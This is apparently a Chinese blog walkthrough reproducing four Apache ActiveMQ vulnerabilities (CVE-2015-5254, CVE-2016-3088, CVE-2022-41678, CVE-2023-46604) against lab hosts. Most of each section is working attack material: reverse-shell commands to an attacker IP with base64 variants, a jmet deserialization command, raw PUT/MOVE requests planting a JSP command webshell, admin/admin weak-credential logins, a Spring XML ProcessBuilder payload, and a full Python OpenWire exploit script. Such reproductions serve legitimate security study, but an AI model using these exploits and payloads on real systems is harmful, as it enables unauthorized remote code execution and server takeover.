> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI5NTQ5MTAzMA==&mid=2247484465&idx=1&sn=d7f9a4567cfd52ae2a3cd15067b1838c

#  【漏洞复现】ActiveMQ中间件漏洞  
 天黑说嘿话   2025-06-22 03:09  
  
ActiveMQ 反序列化漏洞（CVE-2015-5254）  
  
Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。  
  
Apache ActiveMQ   
5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。  
  
  
漏洞影响范围：  
  
Apache ActiveMQ 5.13.0之前5.x版本  
  
  
  
漏洞复现  
  
环境运行后，将监听61616和8161两个端口。其中61616是ActiveMQ工作端口，消息在这个端口进行传递；  
  
8161是ActiveMQ的Web管理页面端口。访问http://ip:8161即可看到web管理页面。  
  
  
http://10.22.221.151:8161/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZGFc3Q4FsWpHWr2ibKEKn9JhPSoiczUW8dZkMwd8UKSVh9md7zrnFJiavg/640?wx_fmt=png&from=appmsg "")  
  
  
访问端口61616，是这样的消息提示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZSb9lR38jAW3DKUw1EZlYYfj9MzMNjbeKQS5S8BaLlSpXeNNdatXibiaA/640?wx_fmt=png&from=appmsg "")  
  
  
拼接admin，访问后台管理  
  
http://10.22.221.151:8161/admin/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZNYC608czqOjcfv3OiaiaZG1n1hKnDSwYMkDxG0soygKWMwEXvqFTsPibQ/640?wx_fmt=png&from=appmsg "")  
  
  
使用弱口令admin/admin，成功登录后台  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZicIdFMKyUgVibPyEUYpM1icLWVYJr2OiakagunMpYFWdsPd0OiaRoARLoJw/640?wx_fmt=png&from=appmsg "")  
  
  
确定版本5.11.1在5.13.0之前的5.x漏洞范围之内  
  
  
下载工具  

```
https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
```

  
  
查看本机的IP  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZFpBot2rUX9dYlere6xKpMqKILX0cbqN1OhjibpbQq089W157XDoz7ow/640?wx_fmt=png&from=appmsg "")  
  
  
替换为自己的IP，构造反弹shell语句  

```
bash -i >& /dev/tcp/10.132.0.76/1234 0>&1
```

  
然后base64编码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z39ibj7RYD0sQEDVvH6Z9BkWic1cm2uLKpN8prfRvJb5GPicuw6Oa1Im6w/640?wx_fmt=png&from=appmsg "")  
  
  

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzIuMC43Ni8xMjM0IDA+JjE=
```

  
  
使用下载的工具，替换base64编码和靶机IP端口  
  
10.22.221.151为靶机IP，61616端口为ActiveMQ的工作端口用来传递消息  
  
  
终端运行命令  

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzIuMC43Ni8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}&#34; -Yp ROME 10.22.221.151 61616
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZZlUy4M5IL8GUaZwBl4y7BTnCuUXFIEIy9vBswxQMIqUyft3xjiaVVBw/640?wx_fmt=png&from=appmsg "")  
  
  
这个工具运行成功之后，会给目标ActiveMQ添加一个名为event的队列  
  
  
同时监听本机端口1234  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZBEvictT1pMQKvvaSfthicaOsCZRkoW7bKJ7sj7VNCNP0QYkYKx41pX5g/640?wx_fmt=png&from=appmsg "")  
  
  
接下来，我们只要去访问这个消息队列，点击触发就可以反弹shell  
  
  
访问路径页面 /admin/browse.jsp?JMSDestination=event  

```
http://10.22.221.151:8161/admin/browse.jsp?JMSDestination=event
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZGTBDf25pjiaxSDyXk5KVL6f00aslUVOV0WzB2XiaJK7UVQ6OvNeo3eKA/640?wx_fmt=png&from=appmsg "")  
  
  
点击查看Message ID  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZARgfCGxYVl4cBRk29ms9ic61X9icibxz6oFoqVDA2jHOFwSwAVZ3NS33g/640?wx_fmt=png&from=appmsg "")  
  
  
  
成功收到会话，并且可以执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZPnliaXnRmG2e94giakzuTWFicvw84iayh0aF7Iyjy3tBWUqCuoxfOUcn3A/640?wx_fmt=png&from=appmsg "")  
  
  
  
ActiveMQ任意文件写入漏洞（CVE-2016-3088）  
  
ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；  
  
admin和api都需要登录后才能使用，fileserver无需登录。  
  
fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：  
  
- 其使用率并不高  
  
- 文件操作容易出现漏洞  
  
所以，  
ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启）；在5.14.0版本以后，彻底删除了fileserver应用。换句话，任意文件写漏洞在版本5.14.0之前，因为之后fileserver就被删除了。  
  
本漏洞出现在fileserver应用中，漏洞原理：  
  
就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。  
  
  
文件写入有几种利用方法：  
- 写入webshell  
  
- 写入cron或ssh key等文件  
  
- 写入jar或jetty.xml等库和配置文件  
  
1、写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；  
  
  
2、写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门）  
  
  
3、写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。  
  
  
漏洞影响范围：  
版本5.0.0--5.14.0  
  
  
漏洞复现  
  
  
访问后台路径  
  
http://10.22.250.67:8161/admin/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZzE52cnR2w8YYaDcgD4avrAsa8RECrAxjRYdia7Y4Ud9mPGm47IqNZPg/640?wx_fmt=png&from=appmsg "")  
  
  
使用弱口令 admin/admin  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZMgHiawVYkn7iawhsxiclrX57gasoOCgG2JYHymicXHAsGtlibI7e5u1bGnQ/640?wx_fmt=png&from=appmsg "")  
  
  
ActiveMQ版本为5.11.1在漏洞影响范围之内Apache ActiveMQ 5.x~5.14.0  
  
  
访问  

```
http://10.22.250.67:8161/admin/test/systemProperties.jsp 
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZvPZgZsuGFRy7bMckkb0RU7FbKEczRXfkS0K7hoRxB6XjW1D2Ciaic3mw/640?wx_fmt=png&from=appmsg "")  
  
  
查看ActiveMQ的绝对路径为 /opt/activemq  
  
  
构造数据包，上传后门  

```
PUT /fileserver/1.txt HTTP/1.1
Host:10.22.250.67:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;   Win64; x64; Trident/5.0)
Connection: close
Content-Length: 327
<%@ page import=&#34;java.io.*&#34;%>
<%
 out.print(&#34;Hello</br>&#34;);
 String   strcmd=request.getParameter(&#34;cmd&#34;);
 String line=null;
 Process   p=Runtime.getRuntime().exec(strcmd);
 BufferedReader br=new   BufferedReader(new InputStreamReader(p.getInputStream()));
 while((line=br.readLine())!=null){
 out.print(line+&#34;</br>&#34;);
 }
%>
```

  
  
204状态表示写入成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZODgfZMHMnz1dVff8ibqt7ibIjgJT7zCrUKzocn2kePXg9aALozbodwQg/640?wx_fmt=png&from=appmsg "")  
  
  
然后移动1.txt后门到api目录下，就可以解析jsp文件  

```
MOVE /fileserver/1.txt HTTP/1.1
Host: 10.22.250.67:8161
Destination:file:///opt/activemq/webapps/api/1.jsp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0)   Gecko/20100101 Firefox/132.0
Accept:   text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:   zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: JSESSIONID=1g843nd2t54jkj3phkc3uxc5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZFnhYlGDa1NgC9tUbWML6fNB53VYfziaweI4xROhm0gm5d6Az6JuX2WA/640?wx_fmt=png&from=appmsg "")  
  
  
  
访问api路径  
  
http://10.22.250.67:8161/api/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZfvN6sR5P5mJjh7ibQShLzxkKAzDuwCBUKXqTD71ItTay0eAPRhNaiaWg/640?wx_fmt=png&from=appmsg "")  
  
需要传参  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z4jP8dzZ520nNXAPyVBfx1FkQU6BJEHdrMjruQsMhKcSg0JKIHFt4ow/640?wx_fmt=png&from=appmsg "")  
  
  
成功执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZRrOo1Opgo0LaxBsGvYiaGaBMLFbCrQmZ8bWicdRKwtqXv8k6LgDgU2rQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
ApacheActiveMQJolokia后台远程代码执行漏洞（CVE-2022-41678）  
  
Apache ActiveMQ 在5.16.5版本及以前和5.17.0< Apache ActiveMQ < 5.17.4版本，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。  
  
  
漏洞影响范围：  
5.16.5版本及以前和5.17.0< Apache ActiveMQ < 5.17.4版本  
  
  
漏洞复现  
  
访问 http://10.22.3.224:8161/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZFSibCNAZdAibbxaO6SfDEc50w8icuFukCp0eTgUYZK5NChjxse7S7c6vQ/640?wx_fmt=png&from=appmsg "")  
  
  
使用弱口令 admin/admin  
  
成功登录后台  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z0FBBhMGH4D7eQHK2ZTdQZds1ERBeskXtZNrC8koiayW3icjmzgVr3ibag/640?wx_fmt=png&from=appmsg "")  
  
  
系统版本为5.17.3在漏洞范围之内  
  
访问接口 /api/jolokia/list  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZFoUw3RibF0uVDnG15lYu5F89QPE4qicOjGWFLyoPoWFQNADoiaMIiagKHg/640?wx_fmt=png&from=appmsg "")  
  
  
发现403，报错内容是请求来源不允许  
  
Origin null is not allowed to call this agent  
  
增加请求来源头  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z23otdOTxkUz8XZGBgFUbggIic3via9CiaoyBlYT8tReGbMtl4YVga0wBQ/640?wx_fmt=png&from=appmsg "")  
  
  
成功访问。  
  
  
代码执行漏洞原理：  
  
使用org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean的setConfigText操作可以更改Log4j的配置，进而将日志文件写入任意目录中。  
  
org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean是由Log4j2提供的一个Mbean。  
  
  
搜索org.apache.logging.log4j.core.jmx 发现有使用相关组件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZduoSuibXhlia8fjvYbnnWtF9ZsYdUnjPlVdscHBG3PZh14grc6PYaBRw/640?wx_fmt=png&from=appmsg "")  
  
  
  
直接使用exp  
  
Exp下载地址  

```
https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZzGd88U9IOwaByJickWylWbhl8biabGrn89LWdqgyxvjsPpYFicnZu2UBA/640?wx_fmt=png&from=appmsg "")  
  
  
访问webshell地址，成功执行命令  
  
http://10.22.3.224:8161/admin/shell.jsp?cmd=id  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZSK3kxXLYJPH6MOH73Z3Ru7RIS89JwMpn88TiaaibTV5o2dAbniaev3pOg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）  
  
OpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。  
在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作OpenWire协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。  
  
  
漏洞影响范围：  
5.18.2版本及以前  
  
  
漏洞复现  
  
访问靶机链接  
  
直接未授权访问后台  
  
http://10.22.250.67:8161/admin/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z0kvQLriaBiaEckn6pFJH0rj7dyo7UmbBt991libajtUHfryXpCVgJm44Q/640?wx_fmt=png&from=appmsg "")  
  
  
版本为5.17.3在漏洞范围之内  
  
构造payload  

```
bash -i >& /dev/tcp/10.132.0.76/1234 0>&1


YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzIuMC43Ni8xMjM0IDA+JjE=


{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8gMTAuMTMyLjAuNzYvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
```

  
  
编辑poc.xml  
  
修改xml为反弹shell命令，加入构造好的payload  

```
<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?>
<beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans
         http://www.springframework.org/schema/beans/spring-beans.xsd&#34;>
    <bean id=&#34;pb&#34;   class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;>
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8gMTAuMTMyLjAuNzYvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZzApA7yHFAgxwjSHzIs0cxMgYhficg3q43WqKSfAnOPSVlvsqUL9Y9SA/640?wx_fmt=png&from=appmsg "")  
  
  
开启一个web服务监听，用来访问下载poc.xml  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z8fnbcOiblhicne1rgicP9UdrlaSKhQAKG0amd1w01TwgGrEAicXFj3dUog/640?wx_fmt=png&from=appmsg "")  
  
  
poc.py  

```
import io
import socket
import sys
def main(ip, port, xml):
    classname =   &#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;
    socket_obj =   socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_obj.connect((ip,   port))
    with socket_obj:
        out =   socket_obj.makefile('wb')
        # out =   io.BytesIO()  # 创建一个内存中的二进制流
          out.write(int(32).to_bytes(4, 'big'))
          out.write(bytes([31]))
          out.write(int(1).to_bytes(4, 'big'))
          out.write(bool(True).to_bytes(1, 'big'))
          out.write(int(1).to_bytes(4, 'big'))
          out.write(bool(True).to_bytes(1, 'big'))
          out.write(bool(True).to_bytes(1, 'big'))
          out.write(len(classname).to_bytes(2, 'big'))
          out.write(classname.encode('utf-8'))
          out.write(bool(True).to_bytes(1, 'big'))
          out.write(len(xml).to_bytes(2, 'big'))
          out.write(xml.encode('utf-8'))
        #   print(list(out.getvalue()))
        out.flush()
        out.close()
if __name__ == &#34;__main__&#34;:
    if len(sys.argv) != 4:
        print(&#34;Please   specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616   &#34;
                &#34;http://192.168.0.101:8888/poc.xml&#34;)
        exit(-1)
    main(sys.argv[1],   int(sys.argv[2]), sys.argv[3])
```

  
  
监听本机IP端口1234  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5ZZ3jVtmP1xZzeAM1LwZOJsUGotC60WctNiaAjszmDWjMILHoyEFiciajsQ/640?wx_fmt=png&from=appmsg "")  
  
  
执行poc.py  

```
python poc.py 10.22.250.67 61616 http://10.132.0.76:8888/poc.xml
```

  
  
10.22.250.67 61616                         
  
为靶机IP和端口  
  
  
http://10.132.0.76:8888/poc.xml   
  
为自己构造的poc.xml,  
注意端口为自己web服务开放的  
  
  
成功接收到会话,  
可以执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KPOk4NM81OfnAttQTmXMCvW1TrdnHp5Z79un2So2m5nDLxeyfic7D3q0fzH1dGdIypCVc6QdqrgkTLpyOUcvohw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
